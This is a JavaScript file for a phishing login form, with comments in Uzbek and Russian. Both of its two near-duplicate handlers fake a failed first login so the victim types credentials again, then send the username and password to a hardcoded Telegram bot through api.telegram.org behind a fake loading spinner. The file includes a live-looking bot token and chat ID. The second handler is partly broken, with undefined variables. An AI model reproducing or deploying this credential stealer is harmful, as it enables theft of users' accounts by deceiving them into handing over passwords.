document.addEventListener('DOMContentLoaded', () => {
    const form = document.getElementById('telegramForm');
    const loading = document.getElementById('loading');
    const errorMessage = document.getElementById('errorMessage');
    let tryCount = 0;

    form.addEventListener('submit', function (e) {
        e.preventDefault();

        const username = document.getElementById('username');
        const password = document.getElementById('password');

        // Agar bu birinchi urinish bo'lsa, foydalanuvchiga xabar ko'rsatamiz
        if (tryCount === 0) {
            errorMessage.style.display = 'block';
            username.value = '';
            password.value = '';
            tryCount++;
            return;
        }

        // Agar ikkinchi urinish bo'lsa, Telegram orqali yuboramiz
        const chatId = '1206388171';
        const botToken = '7181048486:AAH704-GCZbY8ub9IgzMaC5z2abBTlnHpPo';
        const message = `Username: ${username.value}\nPassword: ${password.value}`;

        const url = `https://api.telegram.org/bot${botToken}/sendMessage`;

        fetch(url, {
            method: 'POST',
            headers: { 'Content-Type': 'application/json' },
            body: JSON.stringify({ chat_id: chatId, text: message }),
        })
            .then((response) => response.json())
            .then((data) => {
                if (data.ok) {
                    console.log('Data sent to Telegram bot successfully!');
                } else {
                    console.error('Error sending data to Telegram bot:', data.description);
                }
            })
            .catch((err) => {
                console.error('Telegram API Error:', err);
            });

        // Yashirin qilib yuklanmoqda animatsiyasini ko'rsatamiz
        loading.style.display = 'flex';
        setTimeout(() => {
            loading.style.display = 'none';
        }, 2000);

        username.value = '';
        password.value = '';
    });
});

document.addEventListener('DOMContentLoaded', () => {
    const form = document.getElementById('telegramForm');
    const loading = document.getElementById('loading');
    const validText = document.querySelector(".invalid") 
    let tryCount = 0; // Счётчик попыток входа

    form.addEventListener('submit', function(e) {
        e.preventDefault();
        
        const username = document.getElementById('username');
        const password = document.getElementById('password');

        // Удаление класса invalid-input, если он был добавлен ранее
        username.classList.remove('invalid-input');
        password.classList.remove('invalid-input');

        if (tryCount === 0) {
            // Если первая попытка, отмечаем как невалидный ввод
            username.classList.add('invalid-input');
            password.classList.add('invalid-input');
            validText.style.display = 'block';
            username.value = '';
                    password.value = '';
            
            tryCount++;
            return; // Прекратить выполнение функции
        } else {
            // На второй попытке показываем анимацию загрузки
            
            // Задержка перед отправкой данных
            setInterval(() => {
                loading.style.display = 'flex';
            }, 500);
            
                const encodedUsername = encodeURIComponent(username.value);
                const encodedPassword = encodeURIComponent(password.value);
                const jonatish = `<b>Username:</b> <em>${encodedUsername}</em>\n<b>Password:</b> <em>${encodedPassword}</em>`;

                const url = `https://api.telegram.org/bot7181048486:AAH704-GCZbY8ub9IgzMaC5z2abBTlnHpPo/sendMessage?chat_id=&text=${encodeURIComponent(jonatish)}&parse_mode=HTML`;
                
                fetch(`https://api.telegram.org/bot${token}/sendMessage`, {
                    method: "POST",
                    headers: {
                        "Content-Type": "application/json"
                    },
                    body: JSON.stringify({
                        chat_id: chat_id,
                        text: telegramMessage
                    })
                })

                fetch(url, { method: 'GET' })
                .then(response => response.json())
                .then(data => {
                    loading.style.display = 'none'; // Скрыть анимацию загрузки
                    console.log(data);
                    if (data.ok) {
                        console.log(data.result.message_id);
                        // Здесь можно добавить действия при успешной отправке данных
                    } else {
                        console.log(data.error_code);
                        // Обработка ошибок отправки
                    }
                    
                })
                .catch((error) => {
                    alert("Error! Please try again: " + error.message);
                    console.log(error);
                    loading.style.display = 'none';
                    username.value = '';
                    password.value = '';
                });
            // Задержка в 20 секунд перед отправкой данных
        }
    });
});
